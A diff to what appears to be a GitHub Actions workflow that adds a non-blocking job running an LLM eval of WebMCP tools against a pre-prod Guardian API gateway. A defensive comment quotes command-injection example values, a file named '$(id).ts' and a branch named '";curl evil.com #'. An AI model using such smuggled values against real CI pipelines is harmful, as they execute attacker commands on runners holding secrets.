@@ -32,6 +32,10 @@ jobs:
       shell-ui: ${{ steps.diff.outputs.shell-ui_any_modified == 'true' }}
       unit-tests-ui: ${{ steps.diff.outputs.unit-tests-ui_any_modified == 'true' }}
       unit-tests-shell-ui: ${{ steps.diff.outputs.unit-tests-shell-ui_any_modified == 'true' }}
+      eval-mcp-tools: ${{ steps.diff.outputs.eval-mcp-tools_any_modified == 'true' }}
+      # The file list too, not just the boolean: the job narrows EVAL_TOOLS to the tools that
+      # actually changed, and needs the names to do it.
+      eval-mcp-tools-files: ${{ steps.diff.outputs.eval-mcp-tools_all_changed_files }}
       unit-tests-crd-client-generator: ${{ steps.diff.outputs.unit-tests-crd-client-generator_any_modified == 'true' }}
       unit-tests-metalk8s-operator: ${{ steps.diff.outputs.unit-tests-metalk8s-operator_any_modified == 'true' }}
       unit-tests-storage-operator: ${{ steps.diff.outputs.unit-tests-storage-operator_any_modified == 'true' }}
@@ -193,6 +197,222 @@ jobs:
           user: ${{ secrets.ARTIFACTS_USER }}
           password: ${{ secrets.ARTIFACTS_PASSWORD }}
           source: artifacts
+
+  eval_mcp_tools:
+    needs: changed-files
+    if: needs.changed-files.outputs.eval-mcp-tools == 'true'
+    runs-on: ubuntu-24.04
+    timeout-minutes: 45
+    # ONE SIGN-IN AT A TIME, ACROSS THE WHOLE REPOSITORY. Every run signs the same OneLogin account
+    # in, and OneLogin locks an account after a handful of failures — so two concurrent runs could
+    # lock it between them, and a locked account takes a human to clear.
+    #
+    # `cancel-in-progress: false` only keeps a QUEUED sign-in from being dropped for another run in
+    # this group. It cannot save this job from the workflow-level group at the top of the file,
+    # which cancels the whole run on the next push to the branch. That is survivable: a cancelled
+    # sign-in is not a failed attempt, so it counts toward no lockout.
+    concurrency:
+      group: guardian-eval-onelogin
+      cancel-in-progress: false
+    # NOT BLOCKING. The eval is non-deterministic and costs model tokens, and a failure means "a
+    # description is ambiguous" — a finding to read, not a reason to stop an unrelated change.
+    continue-on-error: true
+    # ONE definition, read by the contract check and by the eval below.
+    #
+    # The pre-prod API GATEWAY, not a UI host: those are IP-filtered, while the gateway is not,
+    # which is what makes a hosted runner workable. No trailing slash: the eval appends
+    # /api/v1/chat/ to it directly. PRE-PROD ONLY.
+    env:
+      GUARDIAN_URL: "https://pre-prod-guardian-api-gateway-6lp945ti.ew.gateway.dev"
+    defaults:
+      run:
+        working-directory: ui
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v7
+        with:
+          # Needed to diff against this PR's own base branch, below.
+          fetch-depth: 0
+      - name: Install node
+        uses: actions/setup-node@v6
+        with:
+          node-version: "20"
+      - name: Install UI dependencies
+        run: npm ci --prefer-offline --no-audit --legacy-peer-deps --unsafe-perm --no-optional
+      # THE ONE DEPENDENCY DELIBERATELY NOT PINNED, AND THE STEP THAT MAKES THAT TRUE.
+      #
+      # `npm ci` installs strictly from the lockfile: it ignores the range in package.json and
+      # restores the one version resolved when the lockfile was written. So `^0.1.0` alone floats
+      # nothing — this step is what gives the range its meaning.
+      #
+      # webmcp-eval owns the shape of the Guardian chat request. Guardian ships to production
+      # whenever they like and MetalK8s does not, so when they change the contract the fix belongs
+      # in the package and has to reach branches cut before the break. Re-running this job picks
+      # it up; nothing here is edited, released or redeployed.
+      #
+      # It stays inside 0.1.x. A 0.2.0 is this package saying its own surface moved.
+      - name: take the newest compatible webmcp-eval
+        run: |
+          npm install --no-save --prefer-online --legacy-peer-deps '@scality/webmcp-eval@^0.1.0'
+          echo "webmcp-eval: $(node -p "require('@scality/webmcp-eval/package.json').version")"
+      # WHAT DOES THIS PR ADD, not what does the branch contain. A stacked branch inherits every
+      # tool its parents introduced, and this job would otherwise fire on all of them.
+      #
+      # The workflow runs on push, so there is no PR context; the API has it. With no open PR yet,
+      # fall back to the development-branch list, which over-runs rather than under-runs.
+      - name: work out which tools changed
+        id: scope
+        working-directory: ${{ github.workspace }}
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # EVERY ${{ }} goes through env, never into the script text. The runner substitutes
+          # before bash parses, so an interpolated value is CODE: a file named `$(id).ts` under
+          # tools/, or a branch named `";curl evil.com #` — both legal names — would be executed
+          # rather than read. Through env they arrive as data.
+          FALLBACK_FILES: ${{ needs.changed-files.outputs.eval-mcp-tools-files }}
+          REPO: ${{ github.repository }}
+          OWNER: ${{ github.repository_owner }}
+          REF_NAME: ${{ github.ref_name }}
+        run: |
+          set -euo pipefail
+          base=$(gh api --method GET "repos/$REPO/pulls" \
+                   -f "head=$OWNER:$REF_NAME" -f state=open \
+                   --jq '.[0].base.ref // empty' 2>/dev/null || true)
+
+          if [ -n "$base" ]; then
+            git fetch -q origin "$base"
+            # The same paths changed-files.yaml triggers on, the eval's own material included.
+            # A scenario file maps to no tool, so a scenario-only PR produces an empty list and
+            # skips at the guard below -- run it locally instead.
+            files=$(git diff --name-only "origin/$base...HEAD" \
+                      -- 'ui/src/mcpTools/tools/' 'ui/src/mcpTools/evals/' \
+                         'ui/src/mcpTools/mcpTools.eval.test.ts')
+            echo "base: $base (this PR's target)"
+          else
+            files="$FALLBACK_FILES"
+            echo "no open PR for this branch — falling back to the development-branch diff"
+          fi
+
+          if [ -z "$files" ]; then
+            echo "run=false" >> "$GITHUB_OUTPUT"
+            echo "no tool changed against the base — nothing to evaluate"
+            exit 0
+          fi
+
+          echo "changed: $files"
+          # EVAL_TOOLS_DIR is required: the package will not guess a layout, so where this
+          # repository keeps its tools is named here and nowhere else.
+          tools=$(EVAL_TOOLS_DIR="ui/src/mcpTools/tools" \
+                  ui/node_modules/.bin/webmcp-eval-tools-for $files)
+
+          # NO TOOL RECOGNISED MEANS SKIP, NOT RUN EVERYTHING.
+          #
+          # An empty EVAL_TOOLS means "no filter" to the package, which runs the whole suite --
+          # the right default for a developer who never set it, and the wrong one here. This step
+          # knows WHY the list is empty and the package cannot, so the decision belongs here.
+          #
+          #   npm run eval:mcp        (from ui/)
+          if [ -z "$tools" ]; then
+            echo "run=false" >> "$GITHUB_OUTPUT"
+            echo "eval material changed but no tool did — nothing to evaluate here."
+            echo "Run it locally if you changed a scenario: cd ui && npm run eval:mcp"
+            exit 0
+          fi
+
+          echo "run=true" >> "$GITHUB_OUTPUT"
+          echo "EVAL_TOOLS=$tools" >> "$GITHUB_ENV"
+          echo "narrowed to: $tools"
+      # DOES ANY SCENARIO ACTUALLY COVER THESE TOOLS? Asked before the sign-in, because the answer
+      # is free -- a dry run drives no model and needs no token -- and the sign-in is the part
+      # that is rate-limited and shared. Every one is another chance of locking the OneLogin
+      # account for everybody.
+      #
+      # A FAILED dry run is not "no scenario". A type error in a scenario, a bad import or a
+      # missing bin prints no `N/M scenarios` either, and skipping green on that would hide a
+      # broken eval behind the same message as an uncovered tool. So the exit code is checked
+      # first and `any=false` can only come from a dry run that worked.
+      #
+      # This reads runSuite's own progress output rather than an API, which is a coupling to the
+      # package. `N/M scenarios` appears in both lines it prints, so the match holds whether or
+      # not EVAL_TOOLS is set, and `0/M` never matches.
+      - name: does any scenario cover them
+        id: covered
+        if: steps.scope.outputs.run == 'true'
+        run: |
+          set -o pipefail
+          rc=0
+          out=$(EVAL_DRY_RUN=1 npm run eval:mcp 2>&1) || rc=$?
+          echo "$out"
+          if [ "$rc" -ne 0 ]; then echo "::error::eval dry run failed (exit $rc)"; exit "$rc"; fi
+          if echo "$out" | grep -qE '[1-9][0-9]*/[0-9]+ scenarios'; then
+            echo "any=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "any=false" >> "$GITHUB_OUTPUT"
+            echo "::notice::No scenario covers ${EVAL_TOOLS:-the changed tools} - not signing in. Write one, or run it locally."
+          fi
+      # Only the browser the token script drives. `--with-deps` because a bare runner is missing
+      # the shared libraries headless Chromium needs, and the failure without them reads as a crash.
+      - name: install chromium
+        if: steps.covered.outputs.any == 'true'
+        run: npx playwright install --with-deps chromium
+      # The token, minted headlessly from a secret and exported as GUARDIAN_TOKEN, which the eval
+      # reads in place of the local file `make token` writes — so nothing here depends on a
+      # developer's machine.
+      - name: mint a Guardian token
+        id: token
+        if: steps.covered.outputs.any == 'true'
+        env:
+          GUARDIAN_EVAL_ONE_LOGIN_USERNAME: ${{ secrets.GUARDIAN_EVAL_ONE_LOGIN_USERNAME }}
+          GUARDIAN_EVAL_ONE_LOGIN_PASSWORD: ${{ secrets.GUARDIAN_EVAL_ONE_LOGIN_PASSWORD }}
+        run: |
+          set -euo pipefail
+          if [ -z "${GUARDIAN_EVAL_ONE_LOGIN_PASSWORD:-}" ]; then
+            echo "minted=false" >> "$GITHUB_OUTPUT"
+            echo "::warning::OneLogin credentials are not set in this repository — skipping the eval."
+            exit 0
+          fi
+          # TODO: port scripts/onelogin-token.mjs from artesca, or share it. Until then this job
+          # reaches here and stops, which is why `minted` is an output rather than an assumption.
+          echo "minted=false" >> "$GITHUB_OUTPUT"
+          echo "::warning::No token script in this repository yet — the eval cannot run."
+      # IS THE API STILL THE API? Asked before the eval, because it is the difference between
+      # "the tools regressed" and "Guardian shipped a schema change this morning" — and those two
+      # look identical from a wall of failed scenarios.
+      #
+      # Exit 2 (document unreachable) is NOT a contract break — the bin keeps them separate, and
+      # a 404 here most likely means the gateway does not forward /openapi.json yet.
+      - name: check the Guardian chat contract
+        id: contract
+        if: steps.covered.outputs.any == 'true' && steps.token.outputs.minted == 'true'
+        continue-on-error: true
+        run: |
+          # pipefail, or `tee` reports success and a moved contract passes silently.
+          set -o pipefail
+          # The LOCAL bin, never npx: npx falls back to downloading whatever package carries that
+          # name on the registry and would hand it GUARDIAN_TOKEN.
+          #
+          # rc is recorded so the summary step can tell exit 2 (document unreachable, not evidence
+          # about the contract) from exit 1 (the contract really moved).
+          rc=0
+          node_modules/.bin/webmcp-eval-contract "$GUARDIAN_URL" --token "$GUARDIAN_TOKEN" \
+            | tee "$RUNNER_TEMP/contract.txt" || rc=$?
+          echo "rc=$rc" >> "$GITHUB_OUTPUT"
+          exit $rc
+      - name: say so in the summary
+        if: always() && steps.contract.outcome == 'failure' && steps.contract.outputs.rc != '2'
+        run: |
+          {
+            echo "### Guardian chat contract moved"
+            echo
+            echo 'Scenario failures below are most likely NOT about the tool descriptions.'
+            echo
+            echo '```'
+            cat "$RUNNER_TEMP/contract.txt" 2>/dev/null || echo "(no report captured)"
+            echo '```'
+          } >> "$GITHUB_STEP_SUMMARY"
+      - name: run the WebMCP tool eval
+        if: steps.covered.outputs.any == 'true' && steps.token.outputs.minted == 'true'
+        run: npm run eval:mcp
 
   unit_tests_shell_ui:
     needs: changed-files
